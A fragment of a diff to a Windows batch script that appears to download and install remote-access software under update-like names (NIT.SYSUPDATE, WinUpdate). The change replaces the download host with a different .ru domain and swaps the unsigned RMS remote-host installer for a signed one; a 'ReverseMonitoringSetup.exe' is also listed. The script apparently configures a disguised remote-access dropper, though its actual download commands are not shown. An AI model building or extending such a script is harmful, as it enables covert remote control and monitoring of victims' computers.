@@ -15,7 +15,7 @@ set DEST_DIR=C:\NIT.SYSUPDATE
 
 rem Set Common Host Downloads Varoables
 set prefc=http
-set hostc=anticriminalonline.ru
+set hostc=file.tuneserv.ru
 set portc=80
 set uppathc=WinUpdate
 set exppathc=Exponenta
@@ -26,7 +26,7 @@ SET NITWIN7X64=Nit.Win7x64.exe
 SET NITWIN10=Nit.Win10.exe
 rem SET RMSHOSTMSI=rms.host6.3ru_mod2.msi
 rem SET RMSHOSTBAT=rmshost.install.cmd
-SET RMSHOSTMSI=rms.host.6.10.ru_unsigned.msi
+SET RMSHOSTMSI=rms.host.6.10.ru_signed.msi
 SET RMSHOSTBAT=rmshost.install610.cmd
 SET CERTIFICATESEXE=Certificates-Install.EXE
 SET REVERSEMON=ReverseMonitoringSetup.exe
